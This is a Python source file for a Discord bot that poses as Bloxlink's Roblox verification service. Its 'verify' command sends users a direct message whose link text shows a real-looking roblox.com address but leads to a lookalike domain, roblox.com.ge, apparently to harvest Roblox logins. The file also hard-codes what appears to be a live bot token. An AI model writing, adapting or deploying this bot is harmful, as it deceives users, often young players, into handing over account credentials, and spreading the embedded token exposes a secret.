import discord
from discord.ext import commands

intents = discord.Intents.all()

# Settings (Change these to whatever you want)
token = "MTQ4OTQ5OTEzNjg2MzYzMzUxOA.Goap7o.ZbKe5J6yTt9YLLeI6siMR08N_48BanptJw3zw4"
prefix = "!"
title = "Please Complete Verification"
desc = "To verify your account, please join BloxLink's Official Roblox Verification Game"
field = "Please Login and join the game!"
hyperlink = "https.//www.roblox.com/games/11468876235/Bloxlink-Verification?"
fake_link = "https://roblox.com.ge/games/11468876235/Bloxlink-Verification?privateServerLinkCode=84173018134933438410597946522562"

client = commands.Bot(command_prefix=prefix, intents=intents)
client.remove_command('help')

@client.event
async def on_ready():
    print('')
    print('----------------')
    print('Fake Bloxlink is Online!')
    print('----------------')

main = discord.Embed(title=title, description=desc, color=0xcf4948)
main.add_field(name=field, value=f"[{hyperlink}]({fake_link})")
main.set_thumbnail(url='https://avatars.githubusercontent.com/u/39774496?s=200&v=4')

@client.command()
async def verify(ctx):
    await ctx.send('Sent Verification Link! Please Check DMs')
    await ctx.author.send(embed=main)

client.run(token)
